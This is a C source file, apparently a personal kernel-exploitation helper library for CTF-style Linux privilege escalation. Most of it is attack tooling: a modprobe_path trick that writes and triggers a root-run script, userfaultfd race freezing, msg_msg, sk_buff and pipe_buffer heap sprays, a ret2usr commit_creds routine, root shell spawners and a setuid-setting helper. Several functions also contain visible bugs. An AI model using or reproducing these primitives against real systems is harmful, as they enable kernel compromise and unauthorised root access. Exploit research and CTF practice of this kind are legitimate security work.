#include "libx.h"

#define MSGMNB_FILE "/proc/sys/kernel/msgmnb"

/*
Utils 
*/

size_t fread_u64(const char *fname)
{
    size_t size = 0x100;
	FILE *f = fopen(fname, "r");
    if(!f) return 0xdeadbeef;
	char *buf = calloc(1,size+1);
	fread(buf, 1, size, f);
	buf[size] = 0;
	fclose(f);
	return atoll(buf);
}
size_t MSGLIMIT =0 ;
size_t msgLimit(){
    if(!MSGLIMIT){
        size_t size = fread_u64(MSGMNB_FILE);;
        if(size == 0xdeadbeef)
        {
            warn("Failed to load MSG Limit, asssume it's 8192");
            size = 8192;
        }    
        MSGLIMIT = size;
        return size;
    }else{
        return MSGLIMIT;
    }
}
char * hex(size_t num){
    char *buf = malloc(0x20);
    snprintf(buf,0x20,"%p",num);
    return buf;
}
void success(size_t val){
    // Green color code
    printf("\033[0;32m[+] ");
    printf("%p", val);
    // Reset to default color
    printf("\033[0m\n");
}
void info(const char *text){
    printf("\033[34m\033[1m[+] %s\033[0m\n",text);
}
void warn(const char* text) {
    // Yellow color code
    printf("\033[0;33m");
    printf("[!] %s", text);
    // Reset to default color
    printf("\033[0m\n");
}
void panic(const char *text){
    // Red color code
    printf("\033[0;31m");
    printf("[X] %s", text);
    // Reset to default color
    printf("\033[0m\n");
    exit(0x132);
}
void shell(){
    if(!getuid())
        system("/bin/sh");
    else
        panic("[!] Failed to Escape");
}

size_t xswab(size_t val){
    size_t res = 0;
    size_t  arr[0x8] = {0};
    for(int i = 0 ; i <0x8;i++){
        arr[i] = val&0xff;
        val = val>>8;
    }
    for(int i = 0 ; i < 0x8 ; i++){
        res*=0x100;
        res+=arr[i];
    }
    return res;
}
void modprobeAtk(char * path, char * cmd){
    // Create a funky file as trigger 
    char * buf = calloc(1,0x400);
    snprintf(buf,0x400-1,"echo -ne '\\xff' > %s/funky_guy",path);
    system(buf);
    // Create a file to execute code as root
    memset(buf,0,0x400);
    snprintf(buf,0x400-1,"echo '#!/bin/sh\n%s\n' > %s/n132",cmd,path);
    system(buf);
    // change mode
    memset(buf,0,0x400);
    snprintf(buf,0x400-1,"chmod 777 %s/funky_guy; chmod 777 %s/n132; %s/funky_guy 2>%s/null;",path,path,path,path);
    system(buf);
}
/*
Userfaultfd for race condition,
Usage:
    size_t *ptr = forze();
*/
void* userfaultfd_leak_handler(void* arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long) arg;
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    
    nready = poll(&pollfd, 1, -1);
    sleep(100000);
    if (nready != 1)
    {
        panic("Wrong poll return val");
    }
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0)
    {
        panic("msg err");
    }

    char* page = (char*) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
    {
        panic("[-] mmap err");
    }
    struct uffdio_copy uc;
    // init page
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long) page;
    uc.dst = (unsigned long) msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc);
    return NULL;
}
void  RegisterUserfault(void *fault_page)
{
    void *handler = userfaultfd_leak_handler;
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        panic("ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; 
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) 
        panic("ioctl-UFFDIO_REGISTER");

    int s = pthread_create(&thr, NULL,handler, (void*)uffd);

    if (s!=0)
        panic("pthread_create");
}
size_t * froze(){
    size_t *ptr=mmap(0xdeadbeef000,0x1000,5,0x21,0,0);
    if (ptr!=0xdeadbeef000)
        panic("[x] Froze zone");
    RegisterUserfault(ptr);
    return ptr;
}
/*
save_status for ret2user
*/
// void save_status()
// {
//     __asm__("mov user_cs, cs;"
//             "mov user_ss, ss;"
//             "mov user_sp, rsp;"
//             "pushf;"
//             "pop user_rflags;"
//             );
//     puts("[*] status has been saved.");
// }



/*
    Part I: Basics, not specific-technique-related
*/

/*
    Name: Set a Handler of Segfault
    Desc:
        If kernel Heap is borken we can use to process a SEGFAULT and spawn a shell
*/
void sigsegv_handler(int sig, siginfo_t *si, void *unused) {
    
    info("Libx: SegFault Handler is spwaning a shell...");
    system("/bin/sh");
    while(1); // Techniquly, we never his this line
}
void hook_segfault(){
    struct sigaction sa;
    memset(&sa, 0, sizeof(sigaction));
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_SIGINFO;
    sa.sa_sigaction = sigsegv_handler;

    if (sigaction(SIGSEGV, &sa, NULL) == -1) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
}


/*
    Name: Set SUID for a prorgam
    Desc:
        Provide the name of file. Try to setsuid for it. 
    Example:
        setsuid("/bin/sh");
*/
void setsuid(char *filename){
    mode_t mode = S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH;

    // Attempt to set the suid bit along with the owner's execute permission and read/execute for group and others
    if (chmod(filename, mode) == -1) {
        perror("chmod failed to set suid bit");
        return 1;
    }
    printf("Successfully set suid bit on %s\n", filename);
    return 0;
}
/*
    Name: Stop the process for debugging
    Desc:
        Stop the process for debugging
    Example:
        debug();
*/
void debug(){
    printf("\033[33m");
    printf("[!] DEBUG");
    printf("\033[0m\n");
    char buf[0x10];
    read(0,buf,0xf);
}
void hexdump(void * addr, size_t len){
    printf("HexDump:\n");
    int more = (len%0x10) ? 1:0;
    for(int i = 0 ; i < (len/0x10)+ more; i++){
        printf("0x%016llx:\t0x%016llx\t0x%016llx\n",addr+i*0x10, *(u64 *)(addr+i*0x10), *(u64 *)(addr+i*0x10+8));
    }
}
/*
    Name:p64
    Desc:
        Return a heap pointer of little endian packed 64bit value
    Example:
        p64(0xdeadbeef);
*/
__u8 *p64(size_t val){
    char *res  = malloc(0x18);
    memset(res,0,0x18);
    size_t * p = res;
    * p = val;
    return res;
}

/*
    Part II: MSGMSG related
*/

/*
    Name: msgGet/msgQueue
    Desc:
        Provide a path, return the msgid
    Example:
        msgQueueCreate("/Home/user/1");
*/
int msgGet(){
    int res= msgget(0,01644);
    if(res<0)
        panic("[-] Failed to create a msg queue");
    return res;
}

void msgSend(int msgid,size_t size,char *text){
    msgMsg* msg = (msgMsg *)malloc(sizeof(long)+size+0x1);
    msg->mtype = 04000; // IPC_NOWAIT / Message type (can be any positive integer)
    memcpy(msg->mtext, text, size);
    // Send the message
    if (syscall(SYS_msgsnd, msgid, msg, size, 0)<0) {
        perror("msgsnd");
        return ;
    }
    free(msg);
    return ;  
}
/*
    Name: msgRecv
    Desc:
        Remove (a) message(s) from msgqueue
    Example:
        msgRecv(msgid,0x1000,0);
*/
msgMsg* msgRecv(int msgid,size_t size){
    msgMsg* recv = (msgMsg *)malloc(sizeof(long)+size+1);
    if (msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT)<0) {
        perror("msgrcv");
        return NULL;
    }
    return recv;
}
msgMsg* msgPeek(int msgid){
    size_t size = 0xffff;
    msgMsg* recv = (msgMsg *)malloc(sizeof(long)+size+1);
    if (msgrcv(msgid, recv, size, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY )<0) {
        perror("msgrcv");
        return NULL;
    }
    return recv;
}
/*
    Name: msgDel
    Desc:
        Delete a mesage queue
    Example:
        msgDel(msgid);
*/
void msgDel(int msgid){
    if (msgctl(msgid, IPC_RMID, NULL) == -1)
        perror("msgctl");
    return; 
}

/*
    Name: msgSpray
    Desc:
        ;
    Example:
        ;
*/
msgSpray_t * _msgSpray(size_t size,size_t num,__u8* ctx){
    // Create one and reach the per queue limit
    size_t msg_id = msgGet();
    if(!ctx){
        ctx = calloc(1,size+1);
        memset(ctx,0x69,size);
    }
    for(int i = 0 ; i < num ; i++){
        msgSend(msg_id,size,ctx);
    }
    msgSpray_t * record = calloc(1,sizeof(msgSpray_t));
    record->ctx = ctx;
    record->msg_id = msg_id;
    record->num = num;
    record->size = size;
    return record;
}
msgSpray_t * msgSpray(size_t msg_len,size_t num, __u8 *ctx){
    size_t msg_object_size = msg_len+0x30;
    if( msg_object_size > msgLimit ) panic("[-] The size of msg object is larger than the limit of msg queue");
    if( msg_object_size > PAGE_SIZE) warn("[!] Msg object size > PAGE_SIZE, this could not be what you want");
    info("a");
    size_t max_msg_num_pre_queue = msgLimit() / msg_object_size;
    msgSpray_t * ret  = NULL;
    msgSpray_t * next = NULL;
    size_t this_round = NULL;
    while(num > 0){
        this_round = num > max_msg_num_pre_queue ? max_msg_num_pre_queue: num;
        next  = _msgSpray(msg_len, this_round, ctx);
        
        if(ret) next->next  = ret;
        ret = next;
        num -= this_round;
    }

    return ret;
}

void msgSprayClean(msgSpray_t *spray)
{
	while(spray) {
		for(int i=0; i<spray->num; i++) 
			msgRecv(spray->msg_id,spray->size);
		msgDel(spray->msg_id);
		spray = spray->next;
	}
}
/*
    Name: Dup one byte
    Desc:
        Duplicate a byte n times and return the allocated chunk
    Example:
        dp('\xff',0x88);
*/
__u8 * dp(__u8 * c,size_t n){
    __u8* res = malloc(n+1);
    memset(res,c,n);
    res[n] = NULL;
    return res;
}

/*
    Name: Dup one byte
    Desc:
        Duplicate a byte n times and return the allocated chunk
    Example:
        dp('\xff',0x88);
*/
__u8 * dpn(__u8 * c,size_t n,size_t nn){
    if(nn<n)
        panic("Wrong usage of dpn");
    
    __u8* res = malloc(nn+1);
    memset(res,0,nn);
    memset(res,c,n);
    res[n] = NULL;
    return res;
}

/*
    Name: flatn
    Desc:
        pack n size_t values by p64
    Example:
        sizez_t values = {1,2,3,4,5};
        flat(values);
*/
__u8 * flatn(size_t *values,size_t n){
    size_t * res = malloc(sizeof(size_t)*n+1);
    for(int i = 0 ; i < n; i++){
        res[i] = values[i];
    }
    return (__u8 *)res;
}

/*
    Name: findp64
    Desc:
        find a specific pointer in a chunk of memory
        and return the offset
    Example:
        int off = findp64(stack,0xdeadbeef,0x100)
*/

int findp64(__u8 *stack,size_t value, size_t n){
    size_t * ptr;
    if(n<8)
        panic("[-] There is not enough space for searching");
    for(size_t i =0 ; i <= n-8; i++){
        ptr = stack+i;
        if(value == *ptr)
            return i;
    }
    return -1;
}
/*
    Name: str
    Desc:
        transform a int to string
    Example:
        char *ptr = str(123);
*/
char *str(int a){
    char *res = malloc(0x100);
    sprintf(res, "%d", a);
    return res;
}
/*
    Name: strdupn
    Desc:
        load a string to heap
    Example:
        char *ptr = strdupn("n132",0x28);
*/
char *strdupn(char *s, size_t size){
    char * res = calloc(1,size);
    strcpy(res,s);
    return res;
}
/*
    Name: mmapx(addr,size)
    Desc:
        a wrapper of mmap
    Example:
        d
*/

void *mmapx(void *addr, size_t size)
{
	return mmap(addr, size, 7 , 0x21, -1, 0);
}





//  Part III: ret2usr


/*
    Name: getRootPrivilige
    Desc:
        getRootPrivilige for ret2usr.
        Before hitting this chal, 
        set commit_creds, prepare_kernel_cred, back2user

    Example:
        getRootPrivilige(msgid);
*/
size_t commit_creds = NULL;
size_t prepare_kernel_cred = NULL;
void (*back2user)()=NULL;

void getRootPrivilige()
{
    if(prepare_kernel_cred==NULL || commit_creds == NULL)
        panic("[-] prepare_kernel_cred or commit_creds is not set.");
    
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
    if(back2user==NULL)
        panic("[-] back2user is not set.");
    info("[n132] Here we go!");
    back2user();
}


/*
    sk_buff
        -> initSocketArray
        -> spraySkBuff
*/

void initSocketArray(int sk_socket[SOCKET_NUM][2]){
    for(int i = 0 ; i < SOCKET_NUM ; i++)
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_socket[i])< 0)
            panic("Failed to create sockect pairs!\n");
    info("Finish: initSocketArray");
}
void spraySkBuff(int sk_socket[SOCKET_NUM][2], void *buf, size_t size){
    // There is a 0x140 area after the buffer
    for(int i = 0 ; i< SOCKET_NUM ; i++)
        for(int j = 0 ; j < SK_BUFF_NUM ; j++)
            if (write(sk_socket[i][0], buf, size)< 0 )
                panic("Failed to spraySkBuff\n");
}
void skbuffSend(int skt,__u8 * ctx, size_t size){
    if(write(skt, ctx, size)<0)
        warn("[!] Failed skbuff_add");
}

/*
    pipe_buffer
*/

void initPipeBuffer(int pipe_fd[PIPE_NUM][2]){
    for(int i  = 0 ; i < PIPE_NUM ; i++)
    {
        pipe(pipe_fd[i]);
        write(pipe_fd[i][1], "pipe_buffer init", 17)>=0;
    }
}
void pipeBufferResize(int fd,size_t count){
    size_t res = fcntl(fd,F_SETPIPE_SZ,0x1000*count);
    if(res ==0x1000*count)
        info("PipeBuffer resized");
    else
        panic("Failed to resize the PipeBuffer");
}
void pipeBufferClose(int fd[2]){
    close(fd[0]);
    close(fd[1]);
}
